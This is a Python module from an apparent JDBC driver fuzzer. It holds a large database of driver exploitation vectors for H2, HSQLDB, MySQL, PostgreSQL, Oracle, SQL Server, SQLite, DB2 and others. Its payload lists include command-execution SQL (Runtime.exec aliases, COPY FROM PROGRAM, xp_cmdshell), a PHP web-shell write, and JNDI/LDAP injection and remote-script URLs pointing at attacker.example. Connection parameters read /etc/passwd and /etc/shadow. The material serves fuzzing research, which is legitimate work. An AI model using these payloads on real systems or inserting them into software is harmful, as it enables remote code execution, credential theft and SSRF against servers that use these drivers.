"""JDBC connection-level mutator for differential fuzzing of JDBC drivers.

Taxonomy-driven mutation targeting JDBC connection URL parameters, connection
pool configurations, and driver-specific exploitation vectors:
  C1  Driver swap              → swap between known JDBC drivers
  C2  URL parameter injection  → inject driver-specific exploit params
  C3  Pool config mutation     → connection pool lifecycle hook abuse
  C4  SQL payload mutation     → driver-appropriate SQL payloads
  C5  Credential mutation      → default/empty/swapped credentials
  C6  URL encoding trick       → percent encoding, double encoding, unicode
  C7  Cross-driver polyglot    → params from one driver applied to another
  C8  Deser property injection → deserialization-triggering properties
  C9  Consistency fix          → repair driver/class/param mismatches
  C10 Exception-guided         → parse target feedback, apply targeted fix

Operates on JDBC Connection IR JSON.  Each driver has associated URL bases,
exploit parameters, SQL payloads, and deserialization properties.  The mutator
tracks strategy effectiveness via adaptive weight feedback.
"""

from __future__ import annotations

import copy
import hashlib
import json
import logging
import random
from typing import Any

from ..protocols import Input

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from ..corpus import Seed

logger = logging.getLogger(__name__)

MAX_OUTPUT_SIZE = 16384

# ---------------------------------------------------------------------------
# Driver database: driver short name → exploitation properties
# ---------------------------------------------------------------------------

DRIVER_DATABASE: dict[str, dict[str, Any]] = {
    "h2": {
        "class": "org.h2.Driver",
        "url_base": ["jdbc:h2:mem:test", "jdbc:h2:file:/tmp/test", "jdbc:h2:tcp://localhost/test"],
        "url_separator": ";",
        "exploit_params": {
            "INIT": [
                "RUNSCRIPT FROM 'http://attacker.example/evil.sql'",
                "CREATE ALIAS EXEC AS 'String e(String c) throws Exception {Runtime.getRuntime().exec(c);return null;}';CALL EXEC('id')",
                "CREATE ALIAS SHELLEXEC AS $$ void e(String c) throws Exception {Runtime.getRuntime().exec(c);} $$;CALL SHELLEXEC('id')",
            ],
            # Source-extracted class-loading params (JdbcUtils.loadUserClass → Class.forName)
            # H2 ALLOWED_CLASSES defaults to "*" — any class can be loaded.
            # Static initializer runs during Class.forName() BEFORE interface cast.
            # Interface: org.h2.api.DatabaseEventListener (all default methods since 1.4.x)
            # Class.forName() triggers <clinit> BEFORE asSubclass check.
            "DATABASE_EVENT_LISTENER": [
                # Gadget classes stripped — C11 classpath_probe + _CANARY_CLASSES
                # will rediscover groovy/bsh/JdbcRowSetImpl via affinity learning.
                # Only keeping the non-gadget real impl:
                "org.h2.security.auth.DefaultAuthenticator",  # H2 internal — Authenticator, not DEL
            ],
            # Interface: org.h2.api.JavaObjectSerializer (no on-classpath impls)
            # Gadget classes stripped — C11 will probe this property.
            "JAVA_OBJECT_SERIALIZER": [],
            "TRACE_LEVEL_SYSTEM_OUT": ["3"],
            "TRACE_LEVEL_FILE": ["3"],
            "MODE": ["MySQL", "PostgreSQL", "Oracle", "MSSQLServer"],
            "ALLOW_LITERALS": ["ALL"],
            "IGNORE_UNKNOWN_SETTINGS": ["TRUE"],
            "PASSWORD_HASH": ["TRUE"],
            "CIPHER": ["AES"],
            "AUTHENTICATOR": ["TRUE"],
            "AUTO_SERVER": ["TRUE"],
            "AUTO_SERVER_PORT": ["9999"],
        },
        "sql_payloads": [
            "CREATE ALIAS EXEC AS 'String e(String c) throws Exception {Runtime.getRuntime().exec(c);return null;}';CALL EXEC('id')",
            "RUNSCRIPT FROM 'http://attacker.example/evil.sql'",
            "CREATE LINKED TABLE EVIL('','jdbc:h2:mem:','sa','','DUAL')",
            "SELECT * FROM CSVREAD('/etc/passwd')",
            "CALL CSVWRITE('/tmp/pwned.csv', 'SELECT 1')",
            # CREATE TRIGGER + ScriptEngine.eval() — no sandbox (pyn3rd)
            "CREATE TRIGGER pwn BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('id')$$",
            "CREATE TRIGGER pwn BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS $$//javascript\nnew java.net.URL('http://attacker.example/').openStream()$$",
        ],
        "deser_properties": {},
        "default_creds": {"user": "sa", "password": ""},
    },
    "hsqldb": {
        "class": "org.hsqldb.jdbc.JDBCDriver",
        "url_base": ["jdbc:hsqldb:mem:test", "jdbc:hsqldb:file:/tmp/test", "jdbc:hsqldb:http://attacker.example/db"],
        "url_separator": ";",
        "exploit_params": {
            "shutdown": ["true"],
            "ifexists": ["false"],
            # crypt_provider: NOT class loading — JCE provider name (Cipher.getInstance)
            # tls_wrapper: NOT class loading — hardcoded factory in HsqlSocketFactory
            # File access via TEXT tables
            "textdb.allow_full_path": ["true"],
            # SQL behavior bypass
            "check_props": ["false"],
            "create": ["true"],
            "recover": ["true"],
        },
        "sql_payloads": [
            "SET DATABASE SQL REFERENCES TRUE;\nCALL \"java.lang.Runtime\".getRuntime().exec('id')",
            "CALL \"java.lang.Runtime\".exec('id')",
            "CALL \"java.lang.System\".setProperty('pwned','true')",
            "CALL \"java.lang.Thread\".sleep(5000)",
            # TEXT table file read
            "SET TABLE LEAK SOURCE '/etc/passwd'",
        ],
        "deser_properties": {
            "sql.live_object": "true",
        },
        "default_creds": {"user": "sa", "password": ""},
    },
    "mysql": {
        "class": "com.mysql.cj.jdbc.Driver",
        "alt_classes": ["com.mysql.jdbc.Driver"],
        "url_base": ["jdbc:mysql://attacker.example/test", "jdbc:mysql://localhost/test"],
        "url_separator": "&",
        "url_prefix": "?",
        "exploit_params": {
            # NOTE: autoDeserialize REMOVED in Connector/J 8.2.0
            "autoDeserialize": ["true"],  # works on older connectors only
            "queryInterceptors": ["com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"],
            "allowLoadLocalInfile": ["true"],
            "allowUrlInLocalInfile": ["true"],
            "allowLoadLocalInfileInPath": ["/etc", "/proc", "C:\\\\"],
            "detectCustomCollations": ["true"],
            "connectionAttributes": ["_client_name:injected"],
            # Source-extracted class-loading params (PropertyKey enum)
            # MySQL: Util.loadClasses() → Class.forName(name, false, loader) → isAssignableFrom
            # NOTE: Class.forName(name, false, loader) uses initialize=false in MySQL 8.2+
            # → clinit does NOT run! Must use on-classpath impls that pass isAssignableFrom.
            # Comma-separated lists supported for interceptors.
            # Interface: com.mysql.cj.jdbc.interceptors.ConnectionLifecycleInterceptor
            # NOTE: ServerStatusDiffInterceptor implements QueryInterceptor, NOT
            # ConnectionLifecycleInterceptor — it goes in queryInterceptors, not here.
            "connectionLifecycleInterceptors": [
                # No public on-classpath impls — C11 will probe this property.
                # Gadgets stripped (MySQL uses initialize=false anyway).
            ],
            # Interface: com.mysql.cj.exceptions.ExceptionInterceptor
            "exceptionInterceptors": [
                "com.mysql.cj.exceptions.ExceptionInterceptorChain",  # real impl on classpath
            ],
            # Interface: com.mysql.cj.conf.ConnectionPropertiesTransform (no on-classpath impls)
            # Called: transformProperties(Properties) — can modify all connection properties.
            "propertiesTransform": [
                # Gadget stripped — C11 will probe.
            ],
            # Interface: com.mysql.cj.protocol.SocketFactory
            "socketFactory": [
                "com.mysql.cj.protocol.StandardSocketFactory",      # real impl
                "com.mysql.cj.protocol.NamedPipeSocketFactory",     # real impl
                "com.mysql.cj.protocol.SocksProxySocketFactory",    # real impl — SSRF via SOCKS
            ],
            "clientInfoProvider": [
                "com.mysql.cj.jdbc.CommentClientInfoProvider",  # built-in
            ],
            # MySQL auth plugin loading — arbitrary class instantiation
            "authenticationPlugins": [
                # Gadget stripped — C11 will probe.
            ],
            "defaultAuthenticationPlugin": ["mysql_native_password"],
            # SSRF/network redirect
            "socksProxyHost": ["attacker.example"],
            "socksProxyPort": ["1080"],
            "ldapServerHostname": ["attacker.example"],
            # Arbitrary SET on connect
            "sessionVariables": [
                "local_infile=1",
                "max_allowed_packet=1073741824",
            ],
            # File read vectors
            "serverRSAPublicKeyFile": ["/etc/passwd"],
            "ociConfigFile": ["/etc/passwd"],
            "allowPublicKeyRetrieval": ["true"],
            # JCA provider class loading
            "keyManagerFactoryProvider": [
                # Spring ClassPathXmlApplicationContext stripped — C11 will probe.
            ],
            "trustManagerFactoryProvider": [
                # Stripped — C11 will probe.
            ],
            "sslContextProvider": [
                # Stripped — C11 will probe.
            ],
        },
        "sql_payloads": [
            "LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE leak",
        ],
        "deser_properties": {
            "autoDeserialize": "true",
            "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
        },
        "default_creds": {"user": "root", "password": ""},
    },
    "postgresql": {
        "class": "org.postgresql.Driver",
        "url_base": ["jdbc:postgresql://attacker.example/test", "jdbc:postgresql://localhost/test"],
        "url_separator": "&",
        "url_prefix": "?",
        "exploit_params": {
            "socketFactory": [
                # Spring/JdbcRowSetImpl gadgets stripped — C11 will probe.
                # Weblogic built-in repackaged Spring (pyn3rd) — not a generic gadget
                "com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext",
                "com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext",
            ],
            "socketFactoryArg": ["http://attacker.example/bean.xml", "ldap://attacker.example/exploit",
                                  "ftp://attacker.example/bean.xml"],
            "sslfactory": [
                # Spring gadget stripped — C11 will probe.
                "com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext",
            ],
            "sslfactoryarg": ["http://attacker.example/bean.xml"],
            "loggerLevel": ["DEBUG"],
            "loggerFile": ["/tmp/pwned", "../../webapps/ROOT/shell.jsp"],
            "preferQueryMode": ["simple"],
            "ApplicationName": ["'; DROP TABLE users; --"],
            # Source-extracted class-loading params (PGProperty enum)
            # PgSQL: Class.forName().asSubclass(type) → tries (Properties), (String), () ctors
            # Interface: org.postgresql.plugin.AuthenticationPlugin (no on-classpath impls)
            # Pure clinit-gadget vector — class loaded during auth handshake.
            "authenticationPluginClassName": [
                # Gadgets stripped — C11 will probe via canary classes.
            ],
            # Interface: javax.net.ssl.HostnameVerifier (JDK standard)
            "sslhostnameverifier": [
                "org.postgresql.ssl.PGjdbcHostnameVerifier",  # real impl on classpath (kept)
            ],
            # Interface: javax.security.auth.callback.CallbackHandler (JDK standard)
            "sslpasswordcallback": [
                # Gadgets stripped — C11 will probe.
            ],
            # Direct Class.forName() → manual cast to PGXmlFactoryFactory
            "xmlFactoryFactory": [
                "LEGACY_INSECURE",                                          # alias: disables XML security (kept)
                "org.postgresql.xml.LegacyInsecurePGXmlFactoryFactory",     # real impl (kept)
                "org.postgresql.xml.DefaultPGXmlFactoryFactory",            # real impl (kept)
            ],
            # SSL file read
            "sslpassword": ["password"],
            # GSS/Kerberos
            "gsslib": ["sspi", "gssapi"],
            "jaasApplicationName": ["pgjdbc"],
            "kerberosServerName": ["attacker.example"],
            # Raw startup parameter injection
            "options": ["-c log_statement=all", "-c client_min_messages=debug5"],
        },
        "sql_payloads": [
            "COPY cmd_exec FROM PROGRAM 'id'",
            "CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text)",
        ],
        "deser_properties": {},
        "default_creds": {"user": "postgres", "password": ""},
    },
    "derby": {
        "class": "org.apache.derby.jdbc.EmbeddedDriver",
        "alt_classes": ["org.apache.derby.jdbc.ClientDriver"],
        "url_base": [
            "jdbc:derby:memory:test;create=true",
            "jdbc:derby://attacker.example/test",  # network mode
        ],
        "url_separator": ";",
        "exploit_params": {
            "create": ["true"],
            "territory": ["ja_JP"],
            # Replication deser: MasterReceiverThread → ObjectInputStream.readObject()
            # Attacker runs fake replication master → sends crafted serialized object
            "startMaster": ["true"],
            "slaveHost": ["attacker.example"],
            "slavePort": ["4851"],
            # Slave mode: connects to master, receives ObjectInputStream
            "startSlave": ["true"],
            "stopMaster": ["true"],
        },
        "sql_payloads": [
            "CALL SYSCS_UTIL.SYSCS_EXPORT_TABLE(null,'SYSSCHEMAS','/tmp/out.csv',null,null,null)",
        ],
        "deser_properties": {
            "startMaster": "true",
            "slaveHost": "attacker.example",
            "slavePort": "4851",
        },
        "default_creds": {"user": "sa", "password": ""},
    },
    "mariadb": {
        "class": "org.mariadb.jdbc.Driver",
        "url_base": ["jdbc:mariadb://attacker.example/test"],
        "url_separator": "&",
        "url_prefix": "?",
        "exploit_params": {
            "autoDeserialize": ["true"],
            "allowLocalInfile": ["true"],
            "localSocket": ["/var/run/mysqld/mysqld.sock"],
        },
        "sql_payloads": [],
        "deser_properties": {"autoDeserialize": "true"},
        "default_creds": {"user": "root", "password": ""},
    },
    "sqlite": {
        "class": "org.sqlite.JDBC",
        "url_base": [
            "jdbc:sqlite::memory:",
            "jdbc:sqlite:/tmp/test.db",
            # :resource: scheme — SSRF: downloads DB from remote URL (pyn3rd)
            "jdbc:sqlite::resource:http://attacker.example/evil.db",
            "jdbc:sqlite::resource:ftp://attacker.example/evil.db",
        ],
        "url_separator": "&",
        "url_prefix": "?",
        "exploit_params": {
            # Native extension loading — RCE if attacker controls a .so/.dll on disk
            "enable_load_extension": ["true"],
        },
        "sql_payloads": [
            "ATTACH DATABASE '/tmp/shell.php' AS shell; CREATE TABLE shell.cmd(d text); INSERT INTO shell.cmd VALUES('<?php system($_GET[\"c\"]);?>')",
            # load_extension requires enable_load_extension=true
            "SELECT load_extension('/tmp/evil.so')",
            "SELECT load_extension('\\\\attacker.example\\share\\evil.dll')",
        ],
        "deser_properties": {},
        "default_creds": {"user": "", "password": ""},
    },
    "oracle": {
        "class": "oracle.jdbc.OracleDriver",
        "url_base": [
            "jdbc:oracle:thin:@//attacker.example:1521/orcl",
            "jdbc:oracle:thin:@//localhost:1521/xe",
            "jdbc:oracle:thin:@(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)"
            "(HOST=attacker.example)(PORT=1521))(CONNECT_DATA=(SID=orcl)))",
        ],
        "url_separator": ";",
        "exploit_params": {
            # --- SSL/TLS file read & SSRF ---
            "oracle.net.customTrustStore": [
                "/etc/passwd", "/etc/shadow",
                "http://attacker.example/evil.jks",
                "file:///etc/hostname",
            ],
            "oracle.net.ssl_server_dn_match": ["false"],
            "oracle.net.ssl_certificate_alias": ["attacker"],
            "javax.net.ssl.trustStore": [
                "/etc/passwd",
                "http://attacker.example/evil.jks",
            ],
            "javax.net.ssl.trustStorePassword": ["changeit", ""],
            "javax.net.ssl.keyStore": [
                "/tmp/keystore.jks",
                "http://attacker.example/evil.jks",
            ],
            "javax.net.ssl.keyStorePassword": ["changeit", ""],
            # --- Network/SSRF ---
            "oracle.net.wallet_location": [
                "(SOURCE=(METHOD=FILE)(METHOD_DATA=(DIRECTORY=/tmp)))",
                "http://attacker.example/wallet",
            ],
            "oracle.net.tns_admin": [
                "/tmp", "/etc", "http://attacker.example/tns",
            ],
            # --- Authentication abuse ---
            "oracle.net.authentication_services": [
                "(KERBEROS5)", "(TCPS)", "(NONE)",
            ],
            "oracle.jdbc.proxyClientName": ["SYS", "SYSTEM", "DBSNMP"],
            # --- Deserialization / class loading ---
            "oracle.jdbc.oracleDriver": [
                "com.sun.rowset.JdbcRowSetImpl",
            ],
            "oracle.net.customLogger": [
                "java.util.logging.FileHandler",
            ],
            # --- Logging file write ---
            "oracle.jdbc.Trace": ["true"],
            "oracle.net.log_volume": ["high"],
            "oracle.net.trace_directory_client": ["/tmp"],
            "oracle.net.trace_file_client": ["pwned.trc"],
            "oracle.net.trace_level_client": ["16"],  # SUPPORT level
        },
        "sql_payloads": [
            # Java stored procedures (requires CREATE PROCEDURE)
            "CREATE OR REPLACE FUNCTION pwn RETURN VARCHAR2 AS LANGUAGE JAVA "
            "NAME 'java.lang.Runtime.exec(java.lang.String) return int'",
            # UTL_FILE read
            "DECLARE f UTL_FILE.FILE_TYPE; BEGIN "
            "f:=UTL_FILE.FOPEN('/etc','passwd','R'); END;",
            # DBMS_SCHEDULER OS command
            "BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'pwn',"
            "job_type=>'EXECUTABLE',job_action=>'/bin/id',"
            "enabled=>TRUE); END;",
            # HTTPURITYPE SSRF
            "SELECT HTTPURITYPE('http://attacker.example/').GETCLOB() FROM DUAL",
        ],
        "deser_properties": {
            "oracle.jdbc.oracleDriver": "com.sun.rowset.JdbcRowSetImpl",
        },
        "default_creds": {"user": "system", "password": "oracle"},
    },
    "sqlserver": {
        "class": "com.microsoft.sqlserver.jdbc.SQLServerDriver",
        "url_base": ["jdbc:sqlserver://attacker.example"],
        "url_separator": ";",
        "exploit_params": {
            "trustServerCertificate": ["true"],
            "authenticationScheme": ["NTLM"],
            "xopenStates": ["true"],
            "domain": ["CORP"],
        },
        "sql_payloads": [
            "EXEC xp_cmdshell 'id'",
            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
        ],
        "deser_properties": {},
        "default_creds": {"user": "sa", "password": "Password1"},
    },
    # --- Additional drivers from pyn3rd research ---
    "db2": {
        "class": "com.ibm.db2.jcc.DB2Driver",
        "url_base": [
            "jdbc:db2://attacker.example:50000/testdb",
            "jdbc:db2://localhost:50000/testdb",
        ],
        "url_separator": ";",
        "exploit_params": {
            # JNDI injection via failover — Context.lookup() on reroute (pyn3rd)
            "clientRerouteServerListJNDIName": ["ldap://attacker.example/exploit"],
            "clientRerouteServerListJNDIContext": ["com.sun.jndi.ldap.LdapCtxFactory"],
            "enableClientAffinitiesList": ["1"],
            "maxRetriesForClientReroute": ["1"],
            "retryIntervalForClientReroute": ["0"],
        },
        "sql_payloads": [],
        "deser_properties": {
            "clientRerouteServerListJNDIName": "ldap://attacker.example/exploit",
        },
        "default_creds": {"user": "db2inst1", "password": "db2inst1"},
    },
    "fabric_mysql": {
        # MySQL Fabric Driver — XXE via XMLRPC, bypasses property whitelists (pyn3rd)
        # Present in Connector/J 5.x, removed in 8.x. SPI auto-registers.
        "class": "com.mysql.fabric.jdbc.FabricMySQLDriver",
        "url_base": [
            "jdbc:mysql:fabric://attacker.example:32274/test",
        ],
        "url_separator": "&",
        "url_prefix": "?",
        "exploit_params": {
            "fabricServerGroup": ["group-1"],
            "fabricProtocol": ["xmlrpc"],  # triggers SAXParser without security
            "fabricUsername": ["admin"],
            "fabricPassword": ["admin"],
        },
        "sql_payloads": [],
        "deser_properties": {},
        "default_creds": {"user": "root", "password": ""},
    },
    "modeshape": {
        # ModeShape JCR — JNDI injection via federated content lookup (pyn3rd)
        "class": "org.modeshape.jdbc.LocalJcrDriver",
        "url_base": [
            "jdbc:jcr:jndi:ldap://attacker.example/exploit",
        ],
        "url_separator": "?",
        "exploit_params": {},
        "sql_payloads": [],
        "deser_properties": {},
        "default_creds": {"user": "", "password": ""},
    },
}

_DRIVER_NAMES: list[str] = list(DRIVER_DATABASE.keys())

# ---------------------------------------------------------------------------
# Connection pool database: pool library → configuration properties
# ---------------------------------------------------------------------------

POOL_DATABASE: dict[str, dict[str, Any]] = {
    "dbcp2": {
        "factory_class": "org.apache.commons.dbcp2.BasicDataSource",
        "lifecycle_hooks": {
            "connectionInitSqls": "list",
            "validationQuery": "string",
        },
        "config_keys": ["initialSize", "maxTotal", "maxIdle", "minIdle", "testOnCreate", "testOnBorrow"],
    },
    "hikari": {
        "factory_class": "com.zaxxer.hikari.HikariDataSource",
        "lifecycle_hooks": {
            "connectionInitSql": "string",
            "connectionTestQuery": "string",
        },
        "config_keys": ["minimumIdle", "maximumPoolSize", "initializationFailTimeout"],
    },
    "c3p0": {
        "factory_class": "com.mchange.v2.c3p0.ComboPooledDataSource",
        "lifecycle_hooks": {
            "preferredTestQuery": "string",
            "connectionCustomizerClassName": "string",
            "userOverridesAsString": "hex_serialized",
        },
        "config_keys": ["initialPoolSize", "minPoolSize", "acquireIncrement"],
    },
    "druid": {
        "factory_class": "com.alibaba.druid.pool.DruidDataSource",
        "lifecycle_hooks": {
            "initConnectionSqls": "list",
            "validationQuery": "string",
            "connectionInitSqls": "list",
            "filters": "string",
        },
        "config_keys": ["initialSize", "minIdle", "init"],
    },
    "tomcat": {
        "factory_class": "org.apache.tomcat.jdbc.pool.DataSource",
        "lifecycle_hooks": {
            "initSQL": "string",
            "validationQuery": "string",
            "validationQueryTimeout": "string",
            "jdbcInterceptors": "string",
            "connectionProperties": "string",
            "dataSourceJNDI": "jndi",
        },
        "config_keys": [
            "initialSize", "minIdle", "maxActive", "maxIdle",
            "testOnConnect", "testOnBorrow", "testOnReturn", "testWhileIdle",
            "jmxEnabled", "fairQueue",
        ],
        # Extra Tomcat-specific attack properties injected alongside hooks
        "extra_attack_properties": {
            "dataSourceJNDI": [
                "ldap://attacker.example/exploit",
                "rmi://attacker.example/exploit",
                "dns://attacker.example",
            ],
            "jdbcInterceptors": [
                # Interceptor class loading — arbitrary class instantiation
                "org.apache.tomcat.jdbc.pool.interceptor.StatementFinalizer",
                "org.apache.tomcat.jdbc.pool.interceptor.ResetAbandonedTimer",
                "org.apache.tomcat.jdbc.pool.interceptor.ConnectionState;"
                "org.springframework.context.support.ClassPathXmlApplicationContext",
                "com.sun.rowset.JdbcRowSetImpl",
            ],
            "connectionProperties": [
                # Passed directly to DriverManager.getConnection() as Properties
                "autoDeserialize=true;queryInterceptors="
                "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "socketFactory=org.springframework.context.support."
                "ClassPathXmlApplicationContext;socketFactoryArg="
                "http://attacker.example/bean.xml",
                "allowLoadLocalInfile=true;allowUrlInLocalInfile=true",
            ],
        },
    },
}

_POOL_NAMES: list[str] = list(POOL_DATABASE.keys())

# ---------------------------------------------------------------------------
# Cross-driver SQL payload pool (for drivers with empty sql_payloads)
# ---------------------------------------------------------------------------

_CROSS_DRIVER_SQL: list[str] = [
    "SELECT 1",
    "SELECT current_user",
    "SELECT version()",
    "SELECT @@version",
    "SELECT user()",
    "SELECT pg_sleep(5)",
    "WAITFOR DELAY '0:0:5'",
    "SELECT SLEEP(5)",
]

# ---------------------------------------------------------------------------
# URL encoding trick helpers
# ---------------------------------------------------------------------------

_ENCODING_TRICKS: list[str] = [
    "percent",
    "double_percent",
    "unicode",
    "case_variation",
    "backslash",
    "null_byte",
]

# ---------------------------------------------------------------------------
# Deserialization-triggering property sets (cross-driver)
# ---------------------------------------------------------------------------

# Each entry has "_drivers" key listing compatible drivers (empty = universal).
# _deser_property_inject() uses this to avoid cross-driver property contamination.
_DESER_PROPERTY_SETS: list[dict[str, str]] = [
    # MySQL autoDeserialize chain (removed in Connector/J 8.2.0 but tests older versions)
    {"_drivers": "mysql,mariadb",
     "autoDeserialize": "true",
     "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"},
    # PostgreSQL socketFactory/sslfactory chains — gadget classes stripped.
    # C11 will rediscover ClassPathXmlApplicationContext via canary probing.
    # C3P0 userOverridesAsString (hex-serialized gadget) — universal pool-level
    {"_drivers": "",
     "userOverridesAsString": "HexEncodedSerializedObject"},
    # MySQL file read
    {"_drivers": "mysql",
     "allowLoadLocalInfile": "true",
     "allowUrlInLocalInfile": "true"},
    # MariaDB deser + file read
    {"_drivers": "mariadb",
     "autoDeserialize": "true",
     "allowLocalInfile": "true"},
    # H2 DATABASE_EVENT_LISTENER, JAVA_OBJECT_SERIALIZER gadgets stripped.
    # PgSQL authenticationPluginClassName gadgets stripped.
    # C11 canary probing will rediscover (groovy, bsh, JdbcRowSetImpl).
    # PgSQL xmlFactoryFactory — LEGACY_INSECURE disables XML security
    {"_drivers": "postgresql",
     "xmlFactoryFactory": "LEGACY_INSECURE"},
    {"_drivers": "postgresql",
     "xmlFactoryFactory": "org.postgresql.xml.LegacyInsecurePGXmlFactoryFactory"},
    # PgSQL sslhostnameverifier — real impl on classpath
    {"_drivers": "postgresql",
     "sslhostnameverifier": "org.postgresql.ssl.PGjdbcHostnameVerifier"},
    # PgSQL sslhostnameverifier groovy gadget stripped — C11 will rediscover.
    # MySQL SocksProxySocketFactory — real impl, redirects traffic via SOCKS proxy
    {"_drivers": "mysql",
     "socketFactory": "com.mysql.cj.protocol.SocksProxySocketFactory",
     "socksProxyHost": "attacker.example",
     "socksProxyPort": "1080"},
    # MySQL exceptionInterceptors — real impl on classpath
    {"_drivers": "mysql",
     "exceptionInterceptors": "com.mysql.cj.exceptions.ExceptionInterceptorChain"},
    # MySQL SSRF via SOCKS proxy — redirects all TCP to attacker
    {"_drivers": "mysql,mariadb",
     "socksProxyHost": "attacker.example",
     "socksProxyPort": "1080"},
    # MySQL LDAP SSRF — redirects LDAP auth to attacker
    {"_drivers": "mysql",
     "ldapServerHostname": "attacker.example"},
    # HSQLDB sql.live_object — enables Java object deserialization in SQL results
    {"_drivers": "hsqldb",
     "sql.live_object": "true"},
    # DB2 JNDI failover — Context.lookup() on reroute (pyn3rd)
    {"_drivers": "db2",
     "clientRerouteServerListJNDIName": "ldap://attacker.example/exploit",
     "enableClientAffinitiesList": "1"},
    # Derby replication deser — ObjectInputStream.readObject() (pyn3rd)
    {"_drivers": "derby",
     "startMaster": "true",
     "slaveHost": "attacker.example",
     "slavePort": "4851"},
    # PgSQL Weblogic repackaged Spring — built-in on WLS (pyn3rd)
    {"_drivers": "postgresql",
     "socketFactory": "com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext",
     "socketFactoryArg": "http://attacker.example/bean.xml"},
]

# ---------------------------------------------------------------------------
# Classpath catalog — loaded from JdbcTarget --enumerate output
# ---------------------------------------------------------------------------

import os
import pathlib

_CATALOG_SEARCH_PATHS = [
    "targets/jdbc_seeds/classpath_catalog.json",
    "jdbc_seeds/classpath_catalog.json",
    "../targets/jdbc_seeds/classpath_catalog.json",
]


class _ClasspathCatalog:
    """Classpath catalog loaded from classpath_catalog.json (JdbcTarget --enumerate)."""

    def __init__(self) -> None:
        self.all_classes: list[str] = []
        self._package_index: dict[str, list[str]] = {}  # "org.h2" → [classes]
        self._loaded = False
        self._load()

    def _load(self) -> None:
        """Load catalog, searching common relative paths. Graceful on missing."""
        for rel in _CATALOG_SEARCH_PATHS:
            path = pathlib.Path(rel)
            if path.exists():
                try:
                    data = json.loads(path.read_text(encoding="utf-8"))
                    self.all_classes = data.get("classes", [])
                    pkg_counts = data.get("packages", {})
                    # Build package index from class list
                    for cls in self.all_classes:
                        dot = cls.rfind(".")
                        if dot > 0:
                            pkg = cls[:dot]
                            self._package_index.setdefault(pkg, []).append(cls)
                    self._loaded = True
                    logger.info(
                        "classpath catalog: %d classes, %d packages from %s",
                        len(self.all_classes), len(self._package_index), path,
                    )
                    return
                except Exception as e:
                    logger.warning("failed to load classpath catalog %s: %s", path, e)

    def get_classes_in_package(self, prefix: str) -> list[str]:
        """Return classes whose package starts with *prefix*."""
        # Prefix match: "org.h2" matches "org.h2", "org.h2.engine", "org.h2.tools"
        result = []
        prefix_dot = prefix + "."
        for pkg, classes in self._package_index.items():
            if pkg == prefix or pkg.startswith(prefix_dot):
                result.extend(classes)
        return result

    def sample(self, rng: random.Random, n: int = 1) -> list[str]:
        if not self.all_classes:
            return []
        return [rng.choice(self.all_classes) for _ in range(n)]


# ---------------------------------------------------------------------------
# Introspection database — auto-extracted driver properties & interface impls
# ---------------------------------------------------------------------------

class _IntrospectionDB:
    """Loads JdbcTarget --introspect output for auto-discovered properties.

    Replaces hardcoded property names and canary classes with data extracted
    directly from the JDBC drivers and classpath at runtime.
    """

    # Map JdbcTarget driver class names to our short driver IDs
    _DRIVER_CLASS_TO_ID = {
        "org.h2.Driver": "h2",
        "org.hsqldb.jdbc.JDBCDriver": "hsqldb",
        "com.mysql.cj.jdbc.Driver": "mysql",
        "org.postgresql.Driver": "postgresql",
        "org.apache.derby.jdbc.EmbeddedDriver": "derby",
    }

    def __init__(self) -> None:
        self.driver_properties: dict[str, list[dict]] = {}  # driver_id → [props]
        self.interface_impls: dict[str, list[str]] = {}      # iface → [impl classes]
        self.clinit_candidates: list[str] = []
        self._loaded = False
        self._try_load()

    def _try_load(self) -> None:
        candidates = [
            os.path.join(os.path.dirname(__file__), "..", "..", "..",
                         "targets", "jdbc_seeds", "driver_introspection.json"),
            os.path.join("targets", "jdbc_seeds", "driver_introspection.json"),
        ]
        for path in candidates:
            path = os.path.abspath(path)
            if os.path.isfile(path):
                try:
                    data = json.loads(pathlib.Path(path).read_text(encoding="utf-8"))
                    # Parse driver properties
                    for driver_class, props in data.get("driver_properties", {}).items():
                        driver_id = self._DRIVER_CLASS_TO_ID.get(driver_class)
                        if driver_id:
                            self.driver_properties[driver_id] = props
                    self.interface_impls = data.get("interface_impls", {})
                    self.clinit_candidates = data.get("clinit_candidates", [])
                    self._loaded = True
                    total_props = sum(len(v) for v in self.driver_properties.values())
                    logger.info(
                        "introspection DB: %d drivers, %d total props, "
                        "%d interface impls, %d clinit candidates from %s",
                        len(self.driver_properties), total_props,
                        sum(len(v) for v in self.interface_impls.values()),
                        len(self.clinit_candidates), path,
                    )
                    return
                except Exception as e:
                    logger.warning("failed to load introspection %s: %s", path, e)

    # Keywords in property name/description suggesting class-loading behavior
    _CLASS_LOADING_KEYWORDS = {
        "class", "factory", "provider", "plugin", "interceptor",
        "handler", "listener", "serializer", "transform", "wrapper",
    }

    def get_all_property_names(self, driver: str) -> list[str]:
        """Return ALL property names for a driver (auto-discovered)."""
        return [p["name"] for p in self.driver_properties.get(driver, [])]

    def get_class_loading_candidates(self, driver: str) -> list[str]:
        """Return property names likely to accept class names.

        Filters by keyword heuristic on name/description — avoids probing
        simple boolean/string properties like 'host', 'port', 'user'.
        """
        result = []
        for p in self.driver_properties.get(driver, []):
            name_lower = p["name"].lower()
            desc_lower = (p.get("description") or "").lower()
            for kw in self._CLASS_LOADING_KEYWORDS:
                if kw in name_lower or kw in desc_lower:
                    result.append(p["name"])
                    break
        return result

    def get_property_choices(self, driver: str, prop_name: str) -> list[str]:
        """Return valid choices for a property, if any."""
        for p in self.driver_properties.get(driver, []):
            if p["name"] == prop_name:
                return p.get("choices", [])
        return []

    def get_interface_implementations(self, interface_name: str) -> list[str]:
        """Return on-classpath classes implementing an interface."""
        return self.interface_impls.get(interface_name, [])

